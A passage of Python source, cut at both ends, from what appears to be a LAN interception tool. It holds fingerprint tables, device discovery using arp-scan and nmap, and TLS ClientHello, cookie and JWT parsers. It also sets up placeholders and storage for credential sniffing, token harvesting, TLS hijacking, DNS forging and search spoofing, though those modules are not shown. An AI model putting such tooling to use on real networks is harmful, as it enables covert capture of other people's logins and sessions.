    "yandex.uz", "yandex.com.am", "yandex.com.ge", "yandex.az",
    "bing.co.uk", "bing.de", "bing.fr", "bing.es", "bing.it",
    "bing.co.jp", "bing.com.br", "bing.com.mx", "bing.com.ar",
    "bing.com.au", "bing.co.in", "bing.co.id", "bing.com.tr",
    "bing.ru", "bing.com.ua", "bing.pl", "bing.nl", "bing.se",
    "bing.no", "bing.dk", "bing.fi", "bing.ie", "bing.pt",
    "duckduckgo.com", "lite.duckduckgo.com", "html.duckduckgo.com",
    "startpage.com", "startpage.eu", "ixquick.com", "ixquick.eu",
    "qwant.com", "qwantjunior.com", "ecosia.org", "ecosia.com",
    "mojeek.com", "mojeek.co.uk", "marginalia.nu", "old-search.marginalia.nu",
    "search.marginalia.nu", "swisscows.com", "swisscows.ch",
    "metager.org", "metager.de", "presearch.com", "presearch.io",
    "you.com", "kagi.com", "perplexity.ai", "phind.com",
    "neeva.com", "andi.com", "arc.net",
)

PORT_SERVICES = {
    20:"FTP-Data",21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",
    67:"DHCP",68:"DHCP",69:"TFTP",80:"HTTP",88:"Kerberos",110:"POP3",
    111:"RPC",119:"NNTP",123:"NTP",135:"RPC",137:"NetBIOS",138:"NetBIOS",
    139:"NetBIOS",143:"IMAP",161:"SNMP",162:"SNMP-Trap",179:"BGP",
    194:"IRC",220:"IMAP3",389:"LDAP",443:"HTTPS",445:"SMB",464:"Kerberos",
    465:"SMTPS",500:"ISAKMP",512:"REXEC",513:"RLOGIN",514:"RSH",
    515:"LPD",520:"Route",548:"AFP",554:"RTSP",587:"SMTP",623:"IPMI",
    631:"IPP",636:"LDAPS",853:"DoT",873:"rsync",902:"VMware",
    993:"IMAPS",994:"IRCS",995:"POP3S",1080:"SOCKS",1099:"RMI",
    1194:"OpenVPN",1433:"MSSQL",1521:"Oracle",1701:"L2TP",1723:"PPTP",
    1883:"MQTT",1900:"SSDP",2049:"NFS",2082:"cPanel",2083:"cPanel-SSL",
    2086:"WHM",2087:"WHM-SSL",2095:"cPanel-Webmail",2096:"cPanel-Webmail-SSL",
    2181:"ZooKeeper",2222:"EtherNetIP",2375:"Docker",2376:"Docker",
    2483:"Oracle",2484:"Oracle",3000:"Node/Dev",3128:"Squid",
    3260:"iSCSI",3268:"LDAP-GC",3269:"LDAP-GC-SSL",3306:"MySQL",
    3389:"RDP",3478:"STUN",3479:"STUN",3480:"STUN",
    4000:"ICQ",4369:"Erlang-EPMD",4505:"Salt",4506:"Salt",
    5000:"UPnP",5060:"SIP",5061:"SIP",5222:"XMPP",5223:"XMPP-APNS",
    5269:"XMPP-Server",5280:"XMPP-BOSH",5353:"mDNS",5355:"LLMNR",
    5432:"PostgreSQL",5433:"PostgreSQL-alt",5555:"Android-ADB",
    5601:"Kibana",5672:"AMQP",5683:"CoAP",5900:"VNC",5901:"VNC",
    5984:"CouchDB",5985:"WinRM",5986:"WinRM-SSL",
    6000:"X11",6379:"Redis",6443:"Kubernetes",6667:"IRC",
    7001:"WebLogic",7002:"WebLogic-SSL",7199:"Cassandra-JMX",
    7474:"Neo4j",7687:"Neo4j-Bolt",8000:"HTTP-alt",8008:"HTTP-alt",
    8009:"AJP",8080:"HTTP-alt",8081:"HTTP-alt",8086:"InfluxDB",
    8088:"HTTP-alt",8090:"HTTP-alt",8123:"ClickHouse",8161:"ActiveMQ",
    8200:"Vault",8388:"Shadowsocks",8443:"HTTPS-alt",8444:"HTTPS-alt",
    8500:"Consul",8529:"ArangoDB",8834:"Nessus",8880:"HTTP-alt",
    8883:"MQTT-SSL",8888:"HTTP-alt",8983:"Solr",9000:"HTTP-alt",
    9001:"HTTP-alt",9042:"Cassandra",9090:"HTTP-alt",9092:"Kafka",
    9100:"Prometheus",9160:"Cassandra-Thrift",9200:"Elasticsearch",
    9300:"Elasticsearch-Transport",9418:"Git",9443:"HTTPS-alt",
    9999:"HTTP-alt",10000:"Webmin",10250:"Kubelet",
    11211:"Memcached",15672:"RabbitMQ-Management",16379:"Redis-alt",
    27017:"MongoDB",27018:"MongoDB",27019:"MongoDB",
    28017:"MongoDB-Web",50000:"SAP",50070:"Hadoop-Namenode",
    50090:"Hadoop-SecondaryNameNode",61616:"ActiveMQ",
    62078:"iPhone-Sync",64738:"Mumble",
}

HTTP_METHODS = (b"GET ", b"POST ", b"PUT ", b"HEAD ", b"OPTIONS ",
                b"DELETE ", b"PATCH ", b"TRACE ", b"CONNECT ")

TLS_MAPPER = {'0x0002':"s2",'0x0300':"s3",'0x0301':"10",'0x0302':"11",
              '0x0303':"12",'0x0304':"13"}

GREASE_SET = set()
for _i in range(0x0a, 0xfb, 0x10):
    GREASE_SET.add(_i * 0x0101)

def _hex16(v): return f"0x{v:04x}"

def _is_grease(v):
    try: return int(v) in GREASE_SET
    except Exception: return False

JA4_TCP_FLAGS = {'SYN': 0x0002, 'ACK': 0x0010, 'FIN': 0x0001}

JA4_KNOWN = [
    {"prefix":"t13d1516h2","b":"8daaf6152771","c":"d8a2da3f94cd","name":"Chrome 136+","type":"browser"},
    {"prefix":"t13d1516h2","b":"8daaf6152771","c":"02713d6af862","name":"Chrome 131","type":"browser"},
    {"prefix":"t13d1516h2","b":"8daaf6152771","c":"e5627efa2ab1","name":"Chrome (FoxIO)","type":"browser"},
    {"prefix":"t13d1717h2","b":"5b57614c22b0","c":"3cbfd9057e0d","name":"Firefox 135+","type":"browser"},
    {"prefix":"t13d1716h2","b":"5b57614c22b0","c":"eeeea6562960","name":"Firefox 133","type":"browser"},
    {"prefix":"t13d2013h2","b":"a09f3c656075","c":"7f0f34a4126d","name":"Safari 18","type":"browser"},
    {"prefix":"t13d2014h2","b":"a09f3c656075","c":"7f0f34a4126d","name":"Safari 18.4","type":"browser"},
    {"prefix":"t13d2014h2","b":"a09f3c656075","c":"d0a99439f9b1","name":"Safari 26.0","type":"browser"},
    {"prefix":"t13d3112h2","b":"e8f1e7e78f70","c":"375ca2c5e164","name":"curl (Linux OpenSSL)","type":"bot"},
    {"prefix":"t13d4907h2","b":"0d8feac7bc37","c":"7395dae3b2f3","name":"curl (macOS)","type":"bot"},
    {"prefix":"t13d4906h1","b":"0d8feac7bc37","c":"7395dae3b2f3","name":"curl (macOS H1)","type":"bot"},
    {"prefix":"t13i4906h2","b":"0d8feac7bc37","c":"7395dae3b2f3","name":"Node.js/curl (no SNI)","type":"bot"},
    {"prefix":"t13d4906h2","b":"0d8feac7bc37","c":"7395dae3b2f3","name":"Node.js (macOS)","type":"bot"},
    {"prefix":"t13d490700","b":"0d8feac7bc37","c":"460f73f9cefb","name":"curl (macOS no ALPN)","type":"bot"},
    {"prefix":"t13i521000","b":"b262b3658495","c":"8e6e362c5eac","name":"LibreSSL s_client","type":"bot"},
    {"prefix":"t12i380400","b":"10ed599f3404","c":"67a080e8974e","name":"Python urllib","type":"bot"},
    {"prefix":"t13d1712h1","b":"ab0a1bf427ad","c":"882d495ac381","name":"Python requests","type":"bot"},
    {"prefix":"t13d1712h1","b":"ab0a1bf427ad","c":"8e6e362c5eac","name":"Python httpx","type":"bot"},
    {"prefix":"t13d1411h2","b":"cbb2034c60b8","c":"e7c285222651","name":"Go net/http","type":"bot"},
    {"prefix":"t13d410","b":"16476d049b0b","c":"78f1d400d464","name":"OpenSSL s_client","type":"bot"},
    {"prefix":"t13d411h2","b":"16476d049b0b","c":"78f1d400d464","name":"OpenSSL s_client h2","type":"bot"},
    {"prefix":"t13d301000","b":"01455d0db58d","c":"5ac7197df9d2","name":"SemrushBot","type":"bot"},
]

JA3_HINTS = {}

MITM_PLAINTEXT_PORTS = {80, 8000, 8008, 8080, 8081, 8088, 8090,
                         8880, 8888, 3000, 5000, 9000, 9090, 9999}
MITM_TLS_PORTS = {443, 8443, 8444, 9443, 4443, 2083, 2087, 2096, 5986, 6443}
MITM_PASSTHROUGH_PORTS = {21, 22, 23, 25, 110, 143, 465, 587, 853,
                           993, 995, 1080}

JA4_ENGINE = None; JA4_TESTDATA = None
CAPTURE = None; MITM_ENGINE = None
DNS_FORGE = None; TLS_TERM = None; PORTAL = None
MITM_PROXY = None
GUARD_MON = None; INTENT_MGR = None; CORRELATOR = None
TLS_HIJACK = None; TCP_FORK = None; H2_HPACK = None
WS_SPLICE = None; ECH_DOWNGRADE = None; QUIC_DOWNGRADE = None
CT_RANKER = None; BASELINE = None; MODULE_REG = None
CONTROL_SOCK = None; NUD_PIN = None; SNI_DEFRAG = None
RECORD_ALIGN = None; ISN_PRESERVE = None; TTL_MIRROR = None
HTTP_PARSER = None; CRED_SNIFF = None; TOKEN_HARVEST = None
CAPTIVE_HIJACK = None; SEARCH_SPOOF = None
TESTHARNESS = None
DHCP4_SERVER = None; DHCP6_SERVER = None; RA_SERVER = None
NDP_SERVER = None; SMB_MSG = None; MDNS_RENAME = None
REPLAY_ENGINE = None; FORWARDER = None; COOKIE_JAR = None
JWT_WATCHER = None; PROTO_CREDS = None

FLOW_SHAPER = None; KALMAN_ARP = None
TTL_MANIP = None; NAT_HIJACK = None; CROSS_APP_CORR = None
BEHAVIOR_TIMING = None; REFRESH_WATCH = None; PSK_BINDER = None
WS_CTRL = None; ECH_OUTER = None; TLS_DRIFT = None
QUIC_CONNID = None; H2_PUSH = None; QUIC_RETRY = None
PROBE_FP = None; BSSID_TRACE = None; WIFIDIRECT = None
ROUTER_FP = None; RULE_ENGINE = None; POLICY_MGR = None
KERNEL_SNAP = None; SIGNED_LOG = None; SQL_STATE = None
LIVE_MIRROR = None; JA4S_FID = None; COOKIE_GRAPH = None
DNS_CHAN_EST = None; PCAP_ROTATE = None
DNSBL_ENGINE = None

class Device:
    def __init__(self, ip, mac=None, hostname=None, vendor=None):
        self.ip = ip; self.mac = mac or "?"
        self.hostname = hostname; self.vendor = vendor or "?"
        self.first_seen = time.time(); self.last_seen = time.time()
        self.pkts = 0; self.bytes = 0; self.up = 0; self.down = 0
        self.dns = deque(maxlen=100)
        self.services = set(); self.ports = set()
        self.sites = OrderedDict()
        self.ja3 = OrderedDict(); self.ja3s = OrderedDict()
        self.last_label = None; self.last_label_ts = 0.0; self.last_svc = None
        self.app_votes = defaultdict(float); self.app_last_seen = {}
        self.ja4 = OrderedDict(); self.ja4s = OrderedDict()
        self.ja4h = OrderedDict(); self.ja4x = OrderedDict()
        self.ja4ssh = OrderedDict(); self.ja4l = OrderedDict()
        self.stack_guess = None; self.stack_updated = 0.0
        self.search_queries = deque(maxlen=50)
        self.mdns_name = None
        self.baseline_sni = set(); self.baseline_ja4 = set()
        self.baseline_rhythm = deque(maxlen=200)
        self.ct_gap = 0; self.session_tickets = []
        self.state = "UNSEEN"; self.state_ts = time.time()
        self.tokens = []; self.credentials = []
        self.requests = deque(maxlen=50); self.cookies = {}
        self.probes = deque(maxlen=200)
        self.bssids = deque(maxlen=50)
        self.req_times = deque(maxlen=300)
        self.policy = "observe_and_enrich"
        self.psk_seen = 0
        self.ext_drift = deque(maxlen=50)
        self.dnsbl_score = 0
        self.dnsbl_hits = deque(maxlen=200)
        self.dhcp_fp = None
        self.ua_browser = False
        self.ua_bot = False
        self.user_agents = deque(maxlen=20)
        self.mitm = False
        self.proxy_http_flows = 0
        self.proxy_https_flows = 0
        self.proxy_pinned = 0
        self.proxy_bytes_in = 0
        self.proxy_bytes_out = 0

class State:
    def __init__(self):
        self.lock = threading.RLock()
        self.devices = {}
        self.mac_index = {}
        self.dns_events = deque(maxlen=CONFIG["dns_events_maxlen"])
        self.ja4_events = deque(maxlen=CONFIG["ja4_events_maxlen"])
        self.ja3_events = deque(maxlen=CONFIG["ja3_events_maxlen"])
        self.flows = {}
        self.alerts = deque(maxlen=500)
        self.encrypted_dns = {}
        self.sni_seen = {}; self.dns_dedup = {}; self.dns_dedup_ops = 0
        self.start = time.time()
        self.pkt_count = 0; self.byte_count = 0
        self.ja4_fp_count = 0; self.ja3_fp_count = 0
        self.running = True; self.db = None
        self.portal_hits = deque(maxlen=200)
        self.search_hits = deque(maxlen=200)
        self.smb_msgs = deque(maxlen=100)
        self.mdns_renames = deque(maxlen=100)
        self.trust_levels = defaultdict(lambda: 0)
        self.guards = deque(maxlen=100)
        self.tls_intercepts = deque(maxlen=200)
        self.tokens = deque(maxlen=1000)
        self.replay_ops = deque(maxlen=100)
        self.fork_ops = deque(maxlen=100)
        self.h2_ops = deque(maxlen=100)
        self.ws_ops = deque(maxlen=200)
        self.ech_ops = deque(maxlen=100)
        self.quic_ops = deque(maxlen=100)
        self.ct_ops = deque(maxlen=100)
        self.ct_queries = deque(maxlen=200)
        self.baseline_ops = deque(maxlen=200)
        self.nud_ops = deque(maxlen=100)
        self.modules_loaded = []
        self.module_rejects = deque(maxlen=100)
        self.control_ops = deque(maxlen=100)
        self.session_tickets = defaultdict(list)
        self.hpack_state = defaultdict(dict)
        self.h2_frames = deque(maxlen=500)
        self.http_requests = deque(maxlen=2000)
        self.http_responses = deque(maxlen=2000)
        self.credentials = deque(maxlen=500)
        self.bodies = deque(maxlen=500)
        self.correlations = deque(maxlen=200)
        self.state_transitions = deque(maxlen=300)
        self.captive_hits = deque(maxlen=200)
        self.dhcp_leases = deque(maxlen=200)
        self.ra_sent = 0; self.ndp_sent = 0
        self.test_results = deque(maxlen=200)
        self.events = deque(maxlen=8000)
        self.cookies = deque(maxlen=2000)
        self.cookie_jar = defaultdict(dict)
        self.jwts = deque(maxlen=200)
        self.oauth_flows = deque(maxlen=200)
        self.csrf_tokens = deque(maxlen=200)
        self.forms = deque(maxlen=200)
        self.tls_decrypted = deque(maxlen=2000)
        self.proto_creds = deque(maxlen=500)
        self.flow_shape = deque(maxlen=200)
        self.kalman_ops = deque(maxlen=200)
        self.ttl_manip_ops = deque(maxlen=100)
        self.nat_hijacks = deque(maxlen=100)
        self.cross_app = deque(maxlen=200)
        self.behavior_apps = deque(maxlen=300)
        self.refresh_chain = deque(maxlen=200)
        self.psk_binders = deque(maxlen=200)
        self.ws_ctrl = deque(maxlen=200)
        self.ech_outer = deque(maxlen=200)
        self.tls_drift = deque(maxlen=200)
        self.quic_connid = deque(maxlen=200)
        self.quic_initials = deque(maxlen=200)
        self.h2_push = deque(maxlen=200)
        self.quic_retry = deque(maxlen=200)
        self.probe_fp = deque(maxlen=300)
        self.bssid_trace = deque(maxlen=300)
        self.wifidirect_svc = deque(maxlen=200)
        self.router_fp = deque(maxlen=50)
        self.rule_hits = deque(maxlen=500)
        self.policy_ops = deque(maxlen=200)
        self.kernel_snap = None
        self.log_tail = deque(maxlen=200)
        self.log_chain_head = b"\x00" * 32
        self.sql_ops = deque(maxlen=100)
        self.mirror_ops = deque(maxlen=100)
        self.ja4s_fidelity = deque(maxlen=200)
        self.cookie_graph = defaultdict(set)
        self.dns_chan_est = deque(maxlen=200)
        self.pcap_rotation = deque(maxlen=50)
        self.tx_injections = deque(maxlen=500)
        self.forward_stats = {"in": 0, "out": 0, "dropped": 0, "shaped": 0}
        self.auto_invokes = deque(maxlen=200)
        self.dnsbl_hits = deque(maxlen=500)
        self.dnsbl_devices = defaultdict(int)
        self.dnsbl_domains = defaultdict(int)
        self.dhcp_fp_hits = deque(maxlen=200)
        self.ua_hits = deque(maxlen=300)
        self.ja4_known_hits = deque(maxlen=300)
        self.mitm_flows = deque(maxlen=500)
        self.mitm_pins = deque(maxlen=200)
        self.mitm_errors = deque(maxlen=200)
        self.proxy_flows = deque(maxlen=1000)
        self.proxy_stats = {"http": 0, "https": 0, "pinned": 0, "errors": 0,
                             "bytes_in": 0, "bytes_out": 0, "active": 0}
        self.doh_blocks = deque(maxlen=200)
        self.ipv6_mitm = deque(maxlen=200)
        self.dirty = 0

STATE = State()

def _emit_event(kind, text, src="observed"):
    entry = (time.time(), kind, src, text)
    with STATE.lock:
        STATE.events.append(entry)
        STATE.dirty += 1
    if SIGNED_LOG:
        try: SIGNED_LOG.append(entry)
        except Exception: pass
    if LIVE_MIRROR:
        try: LIVE_MIRROR.push(f"{kind}|{src}|{text}")
        except Exception: pass
    if RULE_ENGINE:
        try: RULE_ENGINE.evaluate({"kind": kind, "src": src, "text": text})
        except Exception: pass

def _eui64_to_mac(ipv6):
    try:
        if "::" not in ipv6: return None
        tail = ipv6.split("::", 1)[1]; g = tail.split(":")
        if len(g) < 4: return None
        w0, w1, w2, w3 = g[0:4]
        if not all(len(x) == 4 for x in (w0, w1, w2, w3)): return None
        b0 = int(w0[:2], 16) ^ 0x02
        b1 = int(w0[2:], 16); b2 = int(w1[:2], 16)
        b3 = int(w2[2:], 16); b4 = int(w3[:2], 16); b5 = int(w3[2:], 16)
        return f"{b0:02x}:{b1:02x}:{b2:02x}:{b3:02x}:{b4:02x}:{b5:02x}"
    except Exception: return None

def _register_mac(ip, mac):
    if not mac or mac == "?" or not ip: return
    if "." in ip: STATE.mac_index[mac.lower()] = ip

def _resolve_ip_for_display(ip, mac_hint=None):
    if "." in ip: return ip, False
    mac = _eui64_to_mac(ip) if ip.lower().startswith("fe80") else None
    if not mac and mac_hint: mac = mac_hint.lower()
    if mac:
        twin = STATE.mac_index.get(mac)
        if twin: return twin, True
    return ip, False

def _is_public_ip(ip):
    try:
        if ":" in ip: return False
        a = ipaddress.IPv4Address(ip)
        return not (a.is_private or a.is_loopback or a.is_multicast
                    or a.is_link_local or a.is_reserved)
    except Exception: return False

def _is_local_lan(ip):
    if not ip: return False
    if ip.startswith(("224.", "239.", "255.")): return False
    if ip.lower().startswith("ff02:"): return False
    if ip in RESOLVER_IPS: return False
    if CONFIG.get("monitor_mode"):
        if "." in ip:
            return not _is_public_ip(ip)
        return True
    if "." in ip:
        my = CONFIG.get("my_ip")
        if not my: return True
        try:
            net = ipaddress.IPv4Network(f"{my}/{CONFIG.get('netmask', 24)}",
                                         strict=False)
            addr = ipaddress.IPv4Address(ip)
        except Exception: return True
        if addr == net.network_address or addr == net.broadcast_address:
            return False
        return addr in net
    if ip.lower().startswith("fe80:"): return True
    if ip.lower().startswith("fd") or ip.lower().startswith("fc"): return True
    return False

def touch_device(ip, mac=None):
    with STATE.lock:
        if ip not in STATE.devices:
            STATE.devices[ip] = Device(ip, mac=mac,
                                        vendor=lookup_vendor(mac) if mac else "?")
        d = STATE.devices[ip]
        if mac and d.mac == "?":
            d.mac = mac; d.vendor = lookup_vendor(mac)
        d.last_seen = time.time()
        if d.mac and d.mac != "?": _register_mac(d.ip, d.mac)
        STATE.dirty += 1
        return d

def discover_devices(iface, subnet_cidr, quiet=False):
    devices = {}
    if not quiet: console.log("[cyan]Discovery 1/3: ARP scan[/]")
    if sh("which arp-scan"):
        out = sh(f"arp-scan --interface={iface} --localnet --retry=1 "
                 f"--timeout=500", timeout=60)
        for line in out.splitlines():
            m = re.match(r"^(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s*(.*)$",
                          line, re.I)
            if m:
                ip, mac, vendor = m.group(1), m.group(2).lower(), m.group(3).strip()
                if mac == "ff:ff:ff:ff:ff:ff": continue
                if ip in RESOLVER_IPS: continue
                devices[ip] = {"mac": mac,
                                "vendor": vendor or lookup_vendor(mac)}
    if not quiet: console.log("[cyan]Discovery 2/3: Nmap[/]")
    if sh("which nmap"):
        out = sh(f"nmap -sn -n {subnet_cidr} 2>/dev/null", timeout=120)
        for line in out.splitlines():
            m = re.search(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", line)
            if m and m.group(1) not in RESOLVER_IPS:
                devices.setdefault(m.group(1), {"mac": "?", "vendor": "?"})
    if not quiet: console.log("[cyan]Discovery 3/3: ARP cache[/]")
    try:
        with open("/proc/net/arp") as f:
            next(f)
            for line in f:
                parts = line.split()
                if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                    ip, mac = parts[0], parts[3].lower()
                    if ip in RESOLVER_IPS: continue
                    devices.setdefault(ip, {"mac": mac,
                                             "vendor": lookup_vendor(mac)})
    except Exception: pass
    if not quiet:
        console.log(f"[green]Discovered {len(devices)} devices[/]")
    return devices

def resolve_hostnames(devices):
    def worker():
        for ip in list(devices.keys()):
            try: devices[ip]["hostname"] = socket.gethostbyaddr(ip)[0]
            except Exception: pass
    t = threading.Thread(target=worker, daemon=True)
    t.start(); t.join(timeout=15)

def _count_real_devices():
    with STATE.lock: devs = list(STATE.devices.values())
    seen_mac = {}
    out = []
    for d in devs:
        if d.ip in RESOLVER_IPS: continue
        if not _is_local_lan(d.ip) and not _is_me(d.ip) and not _is_gw(d.ip):
            continue
        if "." in d.ip:
            if not (d.mac and d.mac != "?" and MAC_RE.match(d.mac)):
                if d.pkts > 0: out.append(d)
                continue
            key = d.mac.lower()
            if key not in seen_mac:
                seen_mac[key] = d
            else:
                existing = seen_mac[key]
                existing.up += d.up; existing.down += d.down
                existing.pkts += d.pkts; existing.bytes += d.bytes
                existing.services |= d.services
                existing.dnsbl_score += d.dnsbl_score
                existing.proxy_http_flows += d.proxy_http_flows
                existing.proxy_https_flows += d.proxy_https_flows
                existing.proxy_pinned += d.proxy_pinned
                existing.proxy_bytes_in += d.proxy_bytes_in
                existing.proxy_bytes_out += d.proxy_bytes_out
                for dom, n in d.sites.items():
                    existing.sites[dom] = existing.sites.get(dom, 0) + n
                for app, w in d.app_votes.items():
                    existing.app_votes[app] = (existing.app_votes.get(app, 0.0)
                                                + w)
                    existing.app_last_seen[app] = max(
                        existing.app_last_seen.get(app, 0),
                        d.app_last_seen.get(app, 0))
                for attr in ('ja3','ja3s','ja4','ja4s','ja4h','ja4x',
                              'ja4ssh','ja4l'):
                    src = getattr(d, attr); dst = getattr(existing, attr)
                    for k, v in src.items(): dst[k] = v
            continue
        out.append(d)
    out.extend(seen_mac.values())
    return out

def _bump_site(device, dom, max_sites=150):
    if not dom: return
    dom = dom.lower()
    if len(device.sites) >= max_sites and dom not in device.sites:
        try: device.sites.popitem(last=False)
        except Exception: pass
    device.sites[dom] = device.sites.get(dom, 0) + 1
    try: device.sites.move_to_end(dom)
    except Exception: pass

def _bump_app(device, app, weight=1.0):
    if not app: return
    now = time.time()
    decay = CONFIG.get("app_vote_decay_s", 180)
    for a in list(device.app_votes.keys()):
        last = device.app_last_seen.get(a, 0)
        if now - last > decay:
            device.app_votes[a] *= 0.5
            if device.app_votes[a] < 0.25:
                device.app_votes.pop(a, None)
                device.app_last_seen.pop(a, None)
    device.app_votes[app] = device.app_votes.get(app, 0.0) + weight
    device.app_last_seen[app] = now

def _top_apps(device, n=2):
    if not device.app_votes: return []
    items = sorted(device.app_votes.items(), key=lambda kv: -kv[1])
    min_conf = CONFIG.get("app_min_confidence", 2)
    out = [(a, w) for a, w in items if w >= min_conf or len(items) <= n]
    if not out: out = items
    return out[:n]

def _dns_dedup_check(src_ip, dom):
    if not dom: return False
    now = time.time()
    key = (src_ip, dom.lower()); win = CONFIG.get("dns_dup_window_s", 3.0)
    with STATE.lock:
        last = STATE.dns_dedup.get(key); STATE.dns_dedup[key] = now
        STATE.dns_dedup_ops += 1
        if STATE.dns_dedup_ops % 500 == 0:
            cutoff = now - 60.0
            for k in [k for k, t in STATE.dns_dedup.items() if t < cutoff]:
                STATE.dns_dedup.pop(k, None)
        if last is not None and (now - last) < win: return True
    return False

def _detect_encrypted_dns(src_ip, dst_ip, sport, dport, proto):
    if proto == "TCP" and (dport == 853 or sport == 853):
        remote = dst_ip if dport == 853 else src_ip
        return ("DoT", DOT_RESOLVER_IPS.get(remote, remote))
    if proto == "UDP" and (dport == 853 or sport == 853):
        remote = dst_ip if dport == 853 else src_ip
        return ("DoQ", DOT_RESOLVER_IPS.get(remote, remote))
    if proto == "TCP" and (dport == 443 or sport == 443):
        remote = dst_ip if dport == 443 else src_ip
        name = DOH_RESOLVER_IPS.get(remote)
        if name: return ("DoH", name)
    return None

def _parse_set_cookie(value):
    parts = value.split(";")
    name_val = parts[0].strip()
    if "=" not in name_val: return None
    name, val = name_val.split("=", 1)
    attrs = {}
    for p in parts[1:]:
        p = p.strip()
        if "=" in p:
            k, v = p.split("=", 1)
            attrs[k.strip().lower()] = v.strip()
        else:
            attrs[p.lower()] = True
    return {"name": name.strip(), "value": val.strip(), "attrs": attrs}

def _parse_cookie_header(value):
    out = []
    for pair in value.split(";"):
        pair = pair.strip()
        if "=" in pair:
            k, v = pair.split("=", 1)
            out.append({"name": k.strip(), "value": v.strip()})
    return out

def _decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) != 3: return None
        def _b64(s):
            s += "=" * (-len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s))
        header = _b64(parts[0]); payload = _b64(parts[1])
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception: return None

def _decompress(data, encoding):
    if not data: return data
    enc = (encoding or "").lower()
    try:
        if "gzip" in enc: return gzip.decompress(data)
        if "deflate" in enc: return zlib.decompress(data)
        if "br" in enc:
            try:
                import brotli
                return brotli.decompress(data)
            except Exception: return data
    except Exception: pass
    return data

def _parse_client_hello_py(buf):
    result = {"sni": None, "ja3": None, "ja3_raw": None, "ech": False,
              "alpn": None, "alpn_list": [], "version": None, "extensions": [],
              "extensions_raw": [], "ciphers": [], "cipher_ids": [],
              "sig_algs": [], "curves": [], "curve_ids": [],
              "psk_binder": False, "session_ticket": False,
              "session_ticket_data": None,
              "supported_versions": [], "ec_point_formats": [],
              "grease_present": False, "grease_count": 0,
              "ja4": None, "ja4_a": None, "ja4_b": None, "ja4_c": None,
              "ja4_known": None, "ja4_confidence": "low",
              "ja4_bot": False, "ja4_browser": False}
    try:
        if len(buf) < 6 or buf[0] != 0x16: return result
        rec_len = (buf[3] << 8) | buf[4]
        if len(buf) < 5 + rec_len: return result
        hs = buf[5:5 + rec_len]
        if len(hs) < 4 or hs[0] != 0x01: return result
        hs_len = (hs[1] << 16) | (hs[2] << 8) | hs[3]
        body = hs[4:4 + hs_len]
        if len(body) < 42: return result
        ch_version = (body[0] << 8) | body[1]
        result["version"] = _hex16(ch_version)
        pos = 34
        sid_len = body[pos]; pos += 1 + sid_len
        cs_len = (body[pos] << 8) | body[pos + 1]; pos += 2
        cipher_suites = body[pos:pos + cs_len]; pos += cs_len
        raw_ciphers = []
        for i in range(0, len(cipher_suites), 2):
            if i + 1 < len(cipher_suites):
                c = (cipher_suites[i] << 8) | cipher_suites[i + 1]
                raw_ciphers.append(c)
                if c in GREASE_SET:
                    result["grease_present"] = True
                    result["grease_count"] += 1
                else:
                    result["cipher_ids"].append(c)
                    result["ciphers"].append(_hex16(c))
        cm_len = body[pos]; pos += 1 + cm_len
        raw_exts = []; raw_ext_types = []
        if pos + 2 <= len(body):
            ext_total = (body[pos] << 8) | body[pos + 1]; pos += 2
            ext_end = min(len(body), pos + ext_total)
            ext_raw = body[pos:ext_end]
            ep = 0
            while ep + 4 <= len(ext_raw):
                et = (ext_raw[ep] << 8) | ext_raw[ep + 1]
                es = (ext_raw[ep + 2] << 8) | ext_raw[ep + 3]
                ep += 4
                if ep + es > len(ext_raw): break
                ed = ext_raw[ep:ep + es]
                if et in GREASE_SET:
                    result["grease_present"] = True
                    result["grease_count"] += 1
                else:
                    raw_ext_types.append(et)
                    result["extensions"].append(_hex16(et))
                    if et == 0x0000:
                        if len(ed) >= 5:
                            nt = ed[2]; nl = (ed[3] << 8) | ed[4]
                            if nt == 0 and 5 + nl <= len(ed):
                                raw = ed[5:5 + nl]
                                try: cand = raw.decode("ascii", "replace")
                                except Exception: cand = ""
                                if cand and all(32 <= ord(c) < 127
                                                 for c in cand):
                                    result["sni"] = cand
                    elif et == 0x0010:
                        if len(ed) >= 3:
                            alpn_len = (ed[0] << 8) | ed[1]
                            if alpn_len > 0 and 2 + alpn_len <= len(ed):
                                p = 2
                                while p < 2 + alpn_len:
                                    if p >= len(ed): break
                                    plen = ed[p]; p += 1
                                    if p + plen > len(ed): break
                                    try: v = ed[p:p + plen].decode(
                                        "ascii", "replace")
                                    except Exception: v = ""
                                    if v: result["alpn_list"].append(v)
                                    p += plen
                                if (result["alpn_list"]
                                    and not result["alpn"]):
                                    result["alpn"] = result["alpn_list"][0]
                    elif et == 0x000d:
                        if len(ed) >= 2:
                            slen = (ed[0] << 8) | ed[1]
                            sp = 2; s_end = min(len(ed), 2 + slen)
                            while sp + 1 < s_end:
                                sv = (ed[sp] << 8) | ed[sp + 1]
                                if sv not in GREASE_SET:
                                    result["sig_algs"].append(sv)
                                sp += 2
                    elif et == 0x000a:
                        if len(ed) >= 2:
                            glen = (ed[0] << 8) | ed[1]
                            gp = 2; g_end = min(len(ed), 2 + glen)
                            while gp + 1 < g_end:
                                gv = (ed[gp] << 8) | ed[gp + 1]
                                if gv not in GREASE_SET:
                                    result["curves"].append(_hex16(gv))
                                    result["curve_ids"].append(gv)
                                gp += 2
                    elif et == 0x000b:
                        if len(ed) >= 1:
                            fl = ed[0]
                            for k in range(1, min(len(ed), 1 + fl)):
                                result["ec_point_formats"].append(ed[k])
                    elif et == 0x002b:
                        if len(ed) >= 3:
                            vlen = ed[0]
                            p = 1; v_end = min(len(ed), 1 + vlen)
                            while p + 1 < v_end:
                                vv = (ed[p] << 8) | ed[p + 1]
                                if vv not in GREASE_SET:
                                    result["supported_versions"].append(
                                        _hex16(vv))
                                p += 2
                    elif et == 0x002d:
                        result["psk_binder"] = True
                    elif et == 0x0023:
                        result["session_ticket"] = True
                        if len(ed) >= 2:
                            tlen = (ed[0] << 8) | ed[1]
                            if 2 + tlen <= len(ed):
                                result["session_ticket_data"] = ed[2:2 + tlen]
                    elif et == 0xfe0d:
                        result["ech"] = True
                raw_exts.append((et, ed))
                ep += es
        result["extensions_raw"] = raw_ext_types
        try:
            cs_ids = [str(c) for c in raw_ciphers]
            ext_ids = [str(et) for et, _ in raw_exts]
            ja3_str = ",".join([str(ch_version), "-".join(cs_ids),
                                "-".join(ext_ids),
